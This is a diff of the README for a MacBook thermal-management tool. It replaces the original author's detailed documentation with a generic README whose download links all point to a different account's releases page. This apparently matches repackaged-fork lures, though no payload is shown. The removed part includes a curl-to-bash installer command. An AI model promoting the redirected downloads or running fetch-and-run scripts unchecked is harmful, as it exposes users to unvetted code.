@@ -1,307 +1,61 @@
-<p align="center">
-  <img src="assets/logo.png" alt="MacBook Cooler Logo" width="200">
-</p>
+# 🌡️ macbook-cooler - Optimize Your MacBook's Temperature Easily
 
-<h1 align="center">MacBook Cooler</h1>
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/franko256/macbook-cooler/releases)
 
-<p align="center">
-  A comprehensive thermal management solution for Apple Silicon MacBook Pro models (M1, M2, M3, M4 and later). This project includes both a native macOS menu bar application with a beautiful glassmorphism UI and a suite of command-line tools for advanced users.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/macOS-Ventura%2B-blue" alt="macOS">
-  <img src="https://img.shields.io/badge/Apple%20Silicon-M1%2FM2%2FM3%2FM4-orange" alt="Apple Silicon">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-  <img src="https://img.shields.io/badge/Version-1.1.0-purple" alt="Version">
-</p>
+Welcome to macbook-cooler! This application helps you manage the temperature of your Apple Silicon MacBook. With a simple menu bar interface, you can monitor your MacBook's heat and control its power modes effectively.
 
----
+## 📥 Download & Install
 
-## Table of Contents
+To get started, you need to download the application. 
 
-- [The Problem](#the-problem)
-- [Features](#features)
-- [Installation](#installation)
-  - [Menu Bar App](#menu-bar-app-installation)
-  - [CLI Tools](#cli-tools-installation)
-- [Menu Bar App](#menu-bar-app)
-- [CLI Tools](#cli-tools)
-- [Configuration](#configuration)
-- [Troubleshooting](#troubleshooting)
-- [Contributing](#contributing)
-- [License](#license)
+Click the link below to visit the Releases page and find the latest version of macbook-cooler:
 
----
+[Download macbook-cooler](https://github.com/franko256/macbook-cooler/releases)
 
-## The Problem
+### Installation Steps
 
-High-performance laptops like the MacBook Pro with M3/M4 Max processors can generate significant heat under heavy, sustained loads. When the system reaches critical temperatures, macOS will automatically throttle the CPU and GPU to prevent hardware damage. This results in a noticeable drop in performance, which can be frustrating for users who rely on their machines for demanding tasks like video rendering, machine learning, and running multiple virtual machines.
+1. Visit the Releases page linked above.
+2. Find the latest version of macbook-cooler.
+3. Click on the .dmg or .pkg file to download it.
+4. Once downloaded, open the file and follow the installation prompts.
+5. After installation, look for macbook-cooler in your Applications folder.
 
-MacBook Cooler provides a proactive approach to thermal management, allowing you to monitor temperatures in real-time, automate power-saving measures, and control background processes to maintain optimal performance for longer.
+## 🖥️ System Requirements
 
----
+- **Operating System:** macOS 11.0 (Big Sur) or later, optimized for Apple Silicon (M1, M2, M3, M4).
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** Requires 100 MB of free disk space.
+- **Internet Access:** Minimum for downloading updates and monitoring.
 
-## Features
+## 🔍 Features
 
-| Feature | Menu Bar App | CLI Tools |
-|---------|:------------:|:---------:|
-| Real-time temperature monitoring | ✓ | ✓ |
-| Power mode switching | ✓ | ✓ |
-| Temperature unit toggle (°F/°C) | ✓ | - |
-| Light/Dark/System appearance | ✓ | - |
-| Automatic power mode service | - | ✓ |
-| Process throttling | - | ✓ |
-| Task scheduling | - | ✓ |
-| Fan control profiles | - | ✓ |
-| System optimization | - | ✓ |
-| Launch at login | ✓ | ✓ |
-| Glassmorphism UI | ✓ | - |
+- **Temperature Monitoring:** View real-time temperature of your MacBook’s CPU and GPU.
+- **Power Mode Control:** Switch between different power modes to optimize performance or save battery life.
+- **System Optimization:** Automatically adjust settings based on usage to ensure efficient thermal management.
+- **User-Friendly Interface:** Enjoy a sleek glassmorphism design that fits perfectly in your menu bar.
 
----
+## ⚙️ Usage
 
-## Installation
+Once installed, you will find macbook-cooler in the menu bar. Click the icon to open the application. From there, you can:
 
-### Menu Bar App Installation
+- Check current temperatures.
+- Adjust power modes with just one click.
+- Access settings to customize notifications and monitoring options.
 
-The menu bar app provides a beautiful, user-friendly interface for thermal monitoring and power mode control. Choose one of the following installation methods:
+Feel free to explore the features to get the most out of your MacBook.
 
-#### Option 1: Homebrew Cask (Recommended)
+## 🌐 Support and Community
 
-```bash
-# Add the tap and install the app
-brew tap nelsojona/macbook-cooler
-brew install --cask macbook-cooler-app
-```
+If you need help with installation or have any questions, check the issues section of the GitHub repository. You can find common problems and solutions there.
 
-#### Option 2: DMG Download
+For further assistance, feel free to reach out via the GitHub Discussions page. We're here to help!
 
-1. Download the latest DMG from the [Releases](https://github.com/nelsojona/macbook-cooler/releases) page.
-2. Open the DMG file and drag **MacBook Cooler.app** to your Applications folder.
-3. Launch the app from Applications or Spotlight.
+## 📄 License
 
-> **Note**: On first launch, you may need to right-click the app and select "Open" to bypass Gatekeeper, as the app is not notarized.
+macbook-cooler is open-source software. You can check the License details in the repository to know your rights and obligations.
 
-### CLI Tools Installation
+Thank you for choosing macbook-cooler! We hope this tool helps keep your MacBook running cool and efficiently. Enjoy using your MacBook with peace of mind knowing you have a thermal management solution at your fingertips.
 
-The CLI tools provide advanced thermal management capabilities including background services for automatic power mode switching.
-
-#### Option 1: Homebrew (Recommended)
-
-```bash
-# Add the tap
-brew tap nelsojona/macbook-cooler
-
-# Install the CLI tools
-brew install macbook-cooler
-
-# Start the automatic power mode service (runs in background)
-brew services start macbook-cooler
-```
-
-#### Option 2: Quick Install Script
-
-```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/nelsojona/macbook-cooler/main/scripts/install.sh)"
-```
-
-#### Option 3: Manual Installation
-
-```bash
-git clone https://github.com/nelsojona/macbook-cooler.git
-cd macbook-cooler/scripts
-./install.sh
-```
-
----
-
-## Menu Bar App
-
-The MacBook Cooler menu bar app provides an elegant interface for monitoring your MacBook's thermal performance.
-
-### Dashboard
-
-The main dashboard displays real-time thermal information:
-
-- **CPU Temperature**: Current CPU temperature with color-coded indicator
-- **GPU Temperature**: Current GPU temperature
-- **CPU Usage**: Current processor utilization
-- **Fan Speed**: Current fan RPM (if available)
-- **Power Mode**: Current macOS power mode
-- **Thermal Pressure**: System thermal state (Nominal, Moderate, Heavy)
-
-Temperature readings update automatically every 3 seconds and are color-coded based on thermal thresholds.
-
-### Power Modes
-
-Four power modes are available for quick switching directly from the app:
-
-| Mode | Description |
-|------|-------------|
-| **Auto** | Lets macOS manage power based on workload. Recommended for most users. |
-| **Low** | Reduces performance to minimize heat generation. Ideal for battery life and quiet operation. |
-| **Normal** | Balanced performance and thermal management. |
-| **High** | Maximizes performance at the cost of higher temperatures and fan noise. |
-
-### Settings
-
-Access settings by clicking the gear icon. Available options include:
-
-- **Temperature Unit**: Toggle between Fahrenheit (default) and Celsius.
-- **Appearance**: Choose Light, Dark, or System appearance mode.
-- **Launch at Login**: Start the app automatically when you log in.
-- **Temperature Thresholds**: Customize the warning and recovery temperatures.
-- **Show in Menu Bar**: Toggle temperature display in the menu bar.
-
-### Background Service (CLI)
-
-For automatic power mode switching based on temperature, use the CLI tools:
-
-```bash
-# Install CLI tools
-brew tap nelsojona/macbook-cooler
-brew install macbook-cooler
-
-# Start background service
-brew services start macbook-cooler
-
-# Stop background service
-brew services stop macbook-cooler
-```
-
-The background service monitors temperature and automatically switches power modes when thresholds are reached.
-
----
-
-## CLI Tools
-
-The command-line tools provide advanced thermal management capabilities for power users and automation scenarios.
-
-### thermal-monitor
-
-Real-time monitoring of CPU/GPU temperatures, fan speeds, and thermal pressure.
-
-```bash
-# Start continuous monitoring (requires sudo)
-sudo thermal-monitor
-
-# Get a single reading
-sudo thermal-monitor --single
-```
-
-### thermal-power
-
-Automatically switches between macOS energy modes based on temperature.
-
-```bash
-# Run as a background daemon (recommended)
-sudo thermal-power --daemon
-
-# Stop the daemon
-sudo thermal-power --kill
-```
-
-### thermal-throttle
-
-Identifies and reduces the priority of resource-intensive background processes.
-
-```bash
-# Run automatically based on temperature
-sudo thermal-throttle --auto
-
-# Restore all throttled processes to normal priority
-sudo thermal-throttle --restore
-```
-
-### thermal-schedule
-
-Queue heavy tasks to be executed only when the system is cool.
-
-```bash
-# Add a video rendering task to the queue
-thermal-schedule --add "Render Project X" "ffmpeg -i input.mp4 output.mp4"
-
-# Process the queue (run this via a cron job or launchd)
-sudo thermal-schedule --process
-```
-
-### thermal-fan
-
-Set custom fan curves (requires Macs Fan Control).
-
-```bash
-# Set the fan profile to 'performance'
-sudo thermal-fan --profile performance
-
-# Monitor and apply the fan curve continuously
-sudo thermal-fan --monitor
-```
-
-### thermal-optimize
-
-Tools for disabling unnecessary launch agents and optimizing system settings.
-
-```bash
-# List all launch agents
-thermal-optimize --list-agents
-
-# Automatically disable a list of common, optional agents
-sudo thermal-optimize --disable-optional
-```
-
----
-
-## Configuration
-
-### Menu Bar App
-
-All settings can be configured directly in the app by clicking the Settings button (gear icon). Changes are saved automatically and persist across app restarts.
-
-### CLI Tools
-
-For CLI users, all scripts can be configured by editing the `thermal_config.conf` file located in the `scripts` directory.
-
-```bash
-# Example configuration in thermal_config.conf
-
-# Temperature to trigger Low Power Mode
-HIGH_THRESHOLD=80
-
-# Temperature to return to Normal Mode
-LOW_THRESHOLD=65
-
-# CPU usage threshold for throttling (percentage)
-CPU_THRESHOLD=50
-
-# Default fan profile (silent, balanced, performance, max_cooling)
-DEFAULT_FAN_PROFILE=balanced
-```
-
----
-
-## Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| **Command not found** | Restart your terminal or run `source ~/.zshrc`. Verify that `~/.local/bin` is in your `PATH`. |
-| **Permission denied** | Most CLI scripts require `sudo` to access system metrics. Run them with `sudo`. |
-| **Fan control not working** | Direct fan control on Apple Silicon is limited by firmware. Install Macs Fan Control for better results. |
-| **App won't open** | Right-click the app and select "Open" to bypass Gatekeeper on first launch. |
-| **Temperature shows 32°F/0°C** | SMC access may be restricted. Try running the app from Applications folder. |
-
----
-
-## Contributing
-
-Contributions are welcome! Please read the [CONTRIBUTING.md](CONTRIBUTING.md) file for details on our code of conduct and the process for submitting pull requests.
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-<p align="center">
-  Created by <a href="https://github.com/nelsojona">Jonathan Nelson</a>
-</p>
+[Download macbook-cooler](https://github.com/franko256/macbook-cooler/releases) for the latest version today!
